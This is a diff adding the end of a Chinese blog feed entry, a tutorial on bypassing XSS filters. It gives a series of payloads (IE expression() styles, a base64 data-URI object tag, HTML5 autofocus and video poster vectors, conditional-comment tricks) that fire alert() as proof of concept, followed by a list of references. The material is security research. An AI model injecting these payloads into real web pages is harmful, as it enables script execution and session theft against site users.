+<img src="java  scr ipt:alert(/ourren_demo/)">  两次tab,ie6
+<div style="width:exp/**
+**/ression(alert(/ourren_demo/))">ourren_demo</div>  IE
+[/code]</p>
+
+<p><strong>4)</strong><strong>非常见协议</strong></p>
+
+<p>利用object标签，将date属性数据进行base64编码绕过关键数据，同时object标签也是经常被遗忘的标签。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgvaW5zaWdodC1sYWJzLyk8L3NjcmlwdD4=">
+[/code]</p>
+
+<p><strong>5)HTML5</strong></p>
+
+<p>利用HTML5新标签或者新属性进行绕过，相对而言这类利用要求的环境相对比较苛刻，详细见参考文献6。</p>
+
+<p>新标签:<em><button>,<video>,<audio>,<article>,<footer>,<nav></em></p>
+
+<p>新属性:<em>autocomplete, autofocus, pattern ..etc</em></p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<input onfocus=write(1) autofocus>
+<video poster=javascript:alert(1)//></video>
+[/code]</p>
+
+<p><strong>6)</strong><strong>浏览器方面</strong></p>
+
+<p>可以从浏览器解析角度进行考虑，需要浏览器解析方面进行深入分析，然后进行改进与分析，提供几个这类的vector。</p>
+
+<p>// IE的注释方式
+[code lang=&ldquo;javascript&rdquo;]
+<!--[if IE]><img src=# width=0 height=0 onerror=alert(/ourren_demo/)>&lt;![endif]&ndash;><br/>
+<comment><img src="</comment><img src=x onerror=alert(/ourren_demo/)//">   IE
+[/code]
+<h3>1.3.2 利用技巧</h3>
+在实际利用中常常会遇到一些其它问题，比如说代码死循环，长度不够用等先将其总结如下：</p>
+
+<p><strong>       1)expression</strong></p>
+
+<p>由于expression属性比较特殊,同时只支持IE，而其执行相当于一个死循环的EVAL函数，同时style标记里不能出现&#8221;;&ldquo;字符，也就是不能构造多条连接在一起的javascript，因此构造出如下语句：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<DIV STYLE="xss:ex/**/pre/**/ssion(eval(xss));" xss="var Then=new Date();Then.setTime(Then.getTime()+10*1000);
+if(document.cookie.indexOf('Cookie1=') == -1){document.cookie='Cookie1=RAY;expires='+Then.toGMTString();
+alert(/ourren_demo/);}">
+//设置一个COOKIE在10秒后失效，并在这条COOKIE语句中执行其他语句或函数。
+也可以通过window对象来实现：
+<div style="width:expression((window.x==1)?'':(window.x=1,alert(/ourren_demo/)))">xsser</div>
+[/code]</p>
+
+<p><strong>2)</strong><strong>长度限制</strong></p>
+
+<p>这个在&#8221;突破XSS字符数量限制执行任意JS代码&#8221;一文中有详细讲解，参考文献7。当然在支持HTML5的浏览器还可以利用下本地存储。
+<h2><em>参考文献</em></h2>
+<em>1.</em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx"><em><a href="http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx">http://blogs.technet.com/b/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx</a></em></a><em> </em></p>
+
+<p><em>2. Abusing Internet Explorer 8&rsquo;s XSS Filters.pdf </em></p>
+
+<p><em>3. </em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html"><em><a href="http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html">http://hi.baidu.com/thanks4sec/blog/item/1b06348ae87e2cb10df4d27c.html</a></em></a><em> </em></p>
+
+<p><em>4. </em><a href="http://evilcos.me/?p=60"><em><a href="http://evilcos.me/?p=60">http://evilcos.me/?p=60</a></em></a><em> </em></p>
+
+<p><em>5. </em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html"><em><a href="http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html">http://hi.baidu.com/rayh4c/blog/item/c3fb8d0a6bf93422b1351ddc.html</a></em></a><em> </em></p>
+
+<p><em>6. </em><a href="http://html5sec.org/"><em><a href="http://html5sec.org/">http://html5sec.org/</a></em></a><em> </em></p>
+
+<p><em>7. </em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt"><em><a href="http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt">http://huaidan.org/pstzine/0x03/txt/PSTZine_0x03_0x04.txt</a></em></a><em> </em></p>
+
+<p><em>8.</em> <a href="http://zone.wooyun.org/content/368"><a href="http://zone.wooyun.org/content/368">http://zone.wooyun.org/content/368</a></a><em></em></p>
+]]></content>
+  </entry>
+  
+</feed>
